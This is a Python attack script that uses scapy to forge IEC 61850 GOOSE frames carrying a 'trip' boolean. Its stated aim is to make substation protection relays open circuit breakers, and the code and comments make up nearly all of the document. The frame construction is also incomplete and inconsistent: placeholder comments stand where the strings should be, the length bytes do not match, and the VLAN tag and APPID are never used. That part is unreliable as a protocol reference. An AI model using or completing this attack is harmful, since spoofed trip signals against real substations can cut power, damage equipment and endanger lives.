#!/usr/bin/env python3
"""
IEC 61850 GOOSE Message Spoofing
Send false trip signal to substation IEDs
"""

from scapy.all import *

def spoof_goose_trip(target_interface, goose_mac, appid):
    """
    Spoof GOOSE message to trip circuit breaker

    target_interface: Network interface (e.g., 'eth0')
    goose_mac: Multicast MAC address of GOOSE message
    appid: Application ID of GOOSE dataset
    """
    # GOOSE Frame Structure:
    # Ethernet Header + 802.1Q VLAN + GOOSE PDU

    # Ethernet header
    dst_mac = goose_mac  # GOOSE multicast MAC (e.g., 01:0c:cd:01:00:00)
    src_mac = "00:11:22:33:44:55"  # Attacker MAC
    ethertype = 0x88b8  # GOOSE ethertype

    # 802.1Q VLAN tag (optional, depends on network)
    vlan_tag = Dot1Q(vlan=100, prio=7)  # Priority 7 (highest)

    # GOOSE PDU (ASN.1 BER encoded)
    # Simplified structure:
    goose_pdu = bytes([
        0x61, 0x5C,  # GOOSE PDU tag and length
        # gocbRef (GOOSE Control Block Reference)
        0x80, 0x1E,  # Tag, length
        # "SUBSTATION1/LLN0$GO$gcb01"
        # ... (full string)

        # timeAllowedtoLive
        0x81, 0x03,  # Tag, length
        0x00, 0x00, 0xC8,  # 200ms

        # datSet (Dataset reference)
        0x82, 0x1A,  # Tag, length
        # "SUBSTATION1/LLN0$dataset01"

        # goID
        0x83, 0x10,  # Tag, length
        # "GOOSE_TRIP_01"

        # t (Timestamp)
        0x84, 0x08,  # Tag, length
        # Current timestamp

        # stNum (State number - increment on change)
        0x85, 0x01,  # Tag, length
        0x01,  # State 1

        # sqNum (Sequence number)
        0x86, 0x01,  # Tag, length
        0x00,  # Seq 0

        # test (Boolean - false)
        0x87, 0x01, 0x00,

        # confRev (Configuration revision)
        0x88, 0x01, 0x01,

        # ndsCom (Needs commissioning - false)
        0x89, 0x01, 0x00,

        # numDatSetEntries
        0x8A, 0x01, 0x01,  # 1 data item

        # allData (The actual trip signal)
        0xAB, 0x03,  # Tag, length
        0x83, 0x01, 0x01  # BOOLEAN TRUE (TRIP!)
    ])

    # Build complete frame
    frame = Ether(dst=dst_mac, src=src_mac, type=ethertype) / Raw(load=goose_pdu)

    # Send GOOSE message
    sendp(frame, iface=target_interface, verbose=False)

    print(f"[+] GOOSE trip message spoofed")
    print(f"    Target MAC: {dst_mac}")
    print(f"    AppID: {appid}")
    print("    Subscribed IEDs will trip breakers")

# Usage (requires network access to substation LAN):
# spoof_goose_trip('eth0', goose_mac='01:0c:cd:01:00:01', appid=0x0001)
